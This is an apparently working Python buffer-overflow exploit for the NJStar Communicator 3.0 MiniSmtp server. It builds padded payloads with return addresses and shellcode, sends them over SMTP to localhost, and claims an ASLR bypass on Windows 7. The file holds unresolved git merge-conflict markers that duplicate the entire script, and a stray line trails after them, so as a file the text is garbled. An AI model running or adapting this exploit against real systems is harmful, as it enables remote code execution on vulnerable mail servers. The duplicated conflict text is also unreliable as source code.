<<<<<<< HEAD
#! /usr/local/bin/python
 
import socket
import time
 
carriage= chr(0xd)
#######################################
Padding1= chr(0x31)* 275
Jump= '\x8d\x44\x24\x80\xff\xe0\x90\x90'
Junk1= chr(0x90)* 4
return1= '\x2d\x12\x41' # pop retn
egg1= Padding1+Jump+Junk1+return1+carriage
 
#######################################
Padding2= chr(0x32)* 271
return2= '\x2b\x12\x41' # pop pop pop retn
egg2= Padding2+return2+carriage
 
#######################################
Padding3= chr(0x33) * 263
return3= '\x2d\x12\x41' # pop retn
egg3= Padding3+return3+carriage
 
#######################################
Padding4= chr(0x34) * 171
Padding5= chr(0x34) * 22
ShellCode = "\xC7\x43\x20\x63\x61\x6C\x63\xC7\x43\x24\x2E\x65\x78\x65\x33\xC0\
\x66\xB8\x1A\x08\xC1\xE0\x08\xB0\x79\x03\xE8\x8D\x43\x20\x33\xC9\xB1\x01\xC1\
\xC1\x0C\x2B\xE1\x6A\x05\x50\xFF\xD5\x8D\x85\x85\x44\xF8\xFF\x6A\x01\xFF\xD0"
 
return4= '\x2b\x12\x41' # pop pop pop retn
egg4= Padding4+ShellCode+Padding5+return4+carriage
 
#######################################
 
def Send_SMTP (egg):
    connectionx.send(egg +'\n')
    time.sleep(2)
     
connectionx = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 
print "Exploit NJStar Communicator 3.0 MiniSmtp by Zune\n"
print "Windows 7 Ultimate [ASLR Bypass]"
try:
    connectionx.connect(("127.0.0.1",25))#SMTP port 25
    Send_SMTP(egg1)
    Send_SMTP(egg2)
    Send_SMTP(egg3)
    Send_SMTP(egg4)
    connectionx.close()
except socket.error:
    print "it couldn't connect"
=======
#! /usr/local/bin/python
 
import socket
import time
 
carriage= chr(0xd)
#######################################
Padding1= chr(0x31)* 275
Jump= '\x8d\x44\x24\x80\xff\xe0\x90\x90'
Junk1= chr(0x90)* 4
return1= '\x2d\x12\x41' # pop retn
egg1= Padding1+Jump+Junk1+return1+carriage
 
#######################################
Padding2= chr(0x32)* 271
return2= '\x2b\x12\x41' # pop pop pop retn
egg2= Padding2+return2+carriage
 
#######################################
Padding3= chr(0x33) * 263
return3= '\x2d\x12\x41' # pop retn
egg3= Padding3+return3+carriage
 
#######################################
Padding4= chr(0x34) * 171
Padding5= chr(0x34) * 22
ShellCode = "\xC7\x43\x20\x63\x61\x6C\x63\xC7\x43\x24\x2E\x65\x78\x65\x33\xC0\
\x66\xB8\x1A\x08\xC1\xE0\x08\xB0\x79\x03\xE8\x8D\x43\x20\x33\xC9\xB1\x01\xC1\
\xC1\x0C\x2B\xE1\x6A\x05\x50\xFF\xD5\x8D\x85\x85\x44\xF8\xFF\x6A\x01\xFF\xD0"
 
return4= '\x2b\x12\x41' # pop pop pop retn
egg4= Padding4+ShellCode+Padding5+return4+carriage
 
#######################################
 
def Send_SMTP (egg):
    connectionx.send(egg +'\n')
    time.sleep(2)
     
connectionx = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 
print "Exploit NJStar Communicator 3.0 MiniSmtp by Zune\n"
print "Windows 7 Ultimate [ASLR Bypass]"
try:
    connectionx.connect(("127.0.0.1",25))#SMTP port 25
    Send_SMTP(egg1)
    Send_SMTP(egg2)
    Send_SMTP(egg3)
    Send_SMTP(egg4)
    connectionx.close()
except socket.error:
    print "it couldn't connect"
>>>>>>> ab09edaaba59a3e337c0735bdc0bd0224ad31e90
    time.sleep(2)